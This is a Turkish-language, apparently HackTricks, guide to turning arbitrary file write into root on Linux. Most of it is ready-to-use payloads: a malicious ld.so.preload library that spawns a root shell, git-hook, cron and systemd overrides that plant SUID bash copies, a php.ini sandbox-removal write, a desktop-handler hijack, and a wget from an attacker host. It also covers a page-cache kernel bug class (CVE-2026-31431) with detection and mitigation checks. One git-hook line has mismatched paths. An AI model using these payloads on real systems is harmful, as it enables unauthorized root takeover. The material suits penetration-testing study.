# Root'a Keyfi Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Bu dosya **`LD_PRELOAD`** env variable gibi davranır ama aynı zamanda **SUID binaries** içinde de çalışır.\
Eğer bunu oluşturabilir veya değiştirebilirseniz, çalıştırılan her binary ile yüklenecek bir **library yolunu** ekleyebilirsiniz.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) bir git repository’sindeki commit oluşturulduğunda, merge gibi çeşitli **events** sırasında **run** edilen **scripts**’tir. Bu yüzden bir **privileged script veya user** bu actions’ları sık sık gerçekleştiriyorsa ve **`.git` folder** içine **write** etmek mümkünse, bu **privesc** için kullanılabilir.

Örneğin, bir git repo içinde **`.git/hooks`** altında bir script **generate** etmek mümkündür, böylece yeni bir commit oluşturulduğunda her zaman **executed** edilir:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Eğer **root'un çalıştırdığı cron ile ilgili dosyalara yazabiliyorsan**, job bir sonraki çalıştığında genellikle code execution elde edebilirsin. İlginç hedefler şunlardır:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root'un kendi crontab'i, `/var/spool/cron/` veya `/var/spool/cron/crontabs/` içinde
- `systemd` timers ve onların tetiklediği services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipik kötüye kullanım yolları:

- `/etc/crontab` veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job** ekle
- `run-parts` tarafından zaten çalıştırılan bir **script'i değiştir**
- Başlattığı script veya binary'yi değiştirerek mevcut bir timer target'ı **backdoor**'la

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Eğer sadece `run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsan, bunun yerine oraya çalıştırılabilir bir dosya bırak:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` genellikle nokta içeren dosya adlarını yok sayar, bu yüzden `backup.sh` yerine `backup` gibi adları tercih edin.
- Bazı distro’lar klasik cron yerine `anacron` veya `systemd` timers kullanır, ancak abuse fikri aynıdır: **root’un daha sonra çalıştıracağı şeyi modify edin**.

### Service & Socket files

Eğer **`systemd`** unit files veya onlar tarafından referans verilen dosyalara yazabiliyorsanız, unit’i reload edip restart ederek ya da service/socket activation path’in tetiklenmesini bekleyerek root olarak code execution elde edebilirsiniz.

İlginç targets şunları içerir:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından referans verilen service scripts/binaries
- root service tarafından yüklenen writable `EnvironmentFile=` paths

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Yaygın abuse yolları:

- **`ExecStart=` üzerine yazın** değiştirilebilen root-owned bir service unit içinde
- **Kötü amaçlı bir `ExecStart=` ile bir drop-in override ekleyin** ve önce eski olanı temizleyin
- **Unit tarafından zaten referans verilen script/binary’yi backdoor’layın**
- **Socket bir connection aldığında başlayan ilgili `.service` dosyasını değiştirerek bir socket-activated service’i hijack edin**

Örnek kötü amaçlı override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik activation flow:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Eğer servisleri kendiniz yeniden başlatamıyorsanız ama socket-activated bir unit’i düzenleyebiliyorsanız, backdoored servisin root olarak çalışmasını tetiklemek için yalnızca **bir client connection** beklemeniz gerekebilir.

### Privileged bir PHP sandbox tarafından kullanılan restrictive `php.ini` dosyasını overwrite etme

Bazı custom daemon’lar, kullanıcı tarafından sağlanan PHP’yi `php` çalıştırarak ve **restricted `php.ini`** kullanarak doğrular (örneğin, `disable_functions=exec,system,...`). Eğer sandbox’lanmış code hâlâ **herhangi bir write primitive**’e sahipse (örneğin `file_put_contents`) ve daemon’un kullandığı **tam `php.ini` path**’ine erişebiliyorsanız, kısıtlamaları kaldırmak için bu config’i **overwrite** edebilir ve ardından elevated privileges ile çalışan ikinci bir payload gönderebilirsiniz.

Tipik akış:

1. İlk payload sandbox config’ini overwrite eder.
2. İkinci payload, dangerous functions yeniden etkinleştirildiği için code çalıştırır.

Minimal örnek (daemon’un kullandığı path’i değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Eğer daemon root olarak çalışıyorsa (veya root-owned yollar ile doğrulama yapıyorsa), ikinci çalıştırma root context elde eder. Bu, sandboxed runtime hâlâ dosya yazabiliyorsa özünde **config overwrite üzerinden privilege escalation** anlamına gelir.

### binfmt_misc

`/proc/sys/fs/binfmt_misc` konumundaki dosya, hangi binary'nin hangi tür dosyaları çalıştıracağını belirtir. TODO: bunu abuse edip yaygın bir dosya türü açıldığında bir rev shell çalıştırmak için gereksinimleri kontrol et.

### Overwrite schema handlers (like http: or https:)

Bir attacker, victim'ın configuration directories üzerinde write permissions'a sahipse sistem davranışını değiştiren dosyaları kolayca değiştirebilir veya oluşturabilir; bu da istenmeyen code execution ile sonuçlanır. `$HOME/.config/mimeapps.list` dosyasını değiştirerek HTTP ve HTTPS URL handler'larını malicious bir dosyaya yönlendirmek için (örneğin, `x-scheme-handler/http=evil.desktop` ayarlayarak), attacker **herhangi bir http veya https linkine tıklamanın `evil.desktop` dosyasında belirtilen code'u tetiklemesini sağlar**. Örneğin, `$HOME/.local/share/applications` içinde aşağıdaki malicious code'u `evil.desktop` içine yerleştirdikten sonra, herhangi bir external URL tıklaması gömülü command'i çalıştırır:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Daha fazla bilgi için, bunun gerçek bir zafiyeti sömürmek için kullanıldığı [**bu gönderiye**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) bakın.

### Root executing user-writable scripts/binaries

Eğer ayrıcalıklı bir workflow `/bin/sh /home/username/.../script` gibi bir şey çalıştırıyorsa (veya ayrıcalıksız bir kullanıcıya ait bir dizin içindeki herhangi bir binary), bunu hijack edebilirsin:

- **Execution'ı tespit et:** root'un kullanıcı kontrollü path'leri çağırmasını yakalamak için [pspy](https://github.com/DominicBreuker/pspy) ile process'leri izle:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrula:** hem hedef dosyanın hem de dizinin kullanıcı tarafından sahiplenildiğinden/yazılabilir olduğundan emin ol.
- **Hedefi hijack et:** orijinal binary/script’i yedekle ve bir SUID shell oluşturan bir payload bırak (veya başka bir root action), ardından izinleri geri yükle:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ayrıcalıklı eylemi tetikleyin** (ör. helper’ı başlatan bir UI butonuna basmak). Root hijack edilen path’i yeniden execute ettiğinde, yükseltilmiş shell’i `./rootshell -p` ile alın.

### Privileged binary’lerin yalnızca page-cache üzerinde değiştirilmesi

Bazı kernel bug’ları dosyayı **disk üzerinde** değiştirmez. Bunun yerine, sadece okunabilir bir dosyanın **page cache kopyasını** değiştirmenize izin verirler. Eğer bir **setuid** ya da başka şekilde **root-executed** binary’yi hedefleyebilirseniz, sonraki execution saldırgan kontrollü byte’ları memory’den çalıştırabilir ve disk üzerindeki dosya hash’i değişmemiş olsa bile privilege escalation gerçekleşebilir.

Bunu bir **runtime-only file write primitive** olarak düşünmek faydalıdır:

- **Disk temiz kalır**: inode ve disk üzerindeki byte’lar değişmez
- **Memory kirlenir**: cached page’i okuyan/çalıştıran process’ler saldırganın değiştirdiği içeriği alır
- **Etkisi geçicidir**: değişiklik reboot’tan sonra veya cache eviction sonrası kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** bug’ları arasında yer alır:

- Dirty COW bir race’e dayanıyordu
- Dirty Pipe’ın write-position kısıtları vardı
- Bir page-cache-only primitive, vulnerable path cached file-backed pages’e doğrudan write veriyorsa daha güvenilir olabilir

#### Generic privesc flow

1. **file-backed page cache pages** içine yazabilen bir kernel primitive elde et
2. Bunu bir **readable privileged binary** ya da başka bir root-executed file üzerinde kullan
3. Page cache’den evict edilmeden önce execution’ı tetikle
4. Disk üzerindeki dosya hâlâ değiştirilmemiş görünürken root olarak code execution al

Tipik yüksek değerli hedefler:

- **setuid-root** binary’ler
- **root services** tarafından başlatılan helper’lar
- **containers sharing the host kernel/page cache** içinden sık çalıştırılan binary’ler

#### AF_ALG + `splice()` örnek yolu

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Vulnerable path, Linux crypto userspace API’sindeydi (`AF_ALG` / `algif_aead`):

- `splice()` bir okunabilir dosyadan page-cache pages referanslarını crypto TX scatterlist’e taşıyabilir
- in-place `algif_aead` decrypt path source ve destination buffer’ları yeniden kullandı
- `authencesn` ardından destination tag bölgesine yazdı
- bu bölge hâlâ spliced file-backed pages’e referans veriyorsa, write hedef dosyanın **page cache**’ine indi

Dolayısıyla ilginç olan şey CVE’nin kendisi değil, pattern’dir:

- **file-backed cache pages**’i bir kernel subsystem’e ver
- subsystem’in bunları writable output olarak ele almasını sağla
- memory içinde küçük, kontrollü bir overwrite tetikle

Public PoC, `/usr/bin/su` dosyasını memory’de değiştirmek için tekrarlanan **4-byte writes** kullandı ve ardından bunu execute etti.

#### Exposure and hunting

Bu tür bir bug’tan şüpheleniyorsan, sadece disk integrity checks’e güvenme. Ayrıca şunları doğrula:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir modül olarak yüklenebilir/yüklenemez olabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: arayüz kernel içine gömülüdür
- setuid binaries iyi hedeflerdir çünkü yalnızca page-cache üzerinde yapılan bir patch, local foothold'u root'a çevirmek için yeterli olabilir

#### `algif_aead` yolu için attack-surface reduction

Eğer vulnerable arayüz yüklenebilir bir modül tarafından sağlanıyorsa:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Eğer kernel içine derlenmişse, bazı leak'ler init yolunu şu şekilde engellediğini bildirdi:
```bash
initcall_blacklist=algif_aead_init
```
Bu tür bir mitigation, diğer kernel LPE'ler için de hatırlanmaya değer: exploitation belirli bir optional interface'e bağlıysa, bu interface'i devre dışı bırakmak veya blacklist etmek, tam bir kernel upgrade mevcut olmadan bile exploit yolunu bozabilir.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
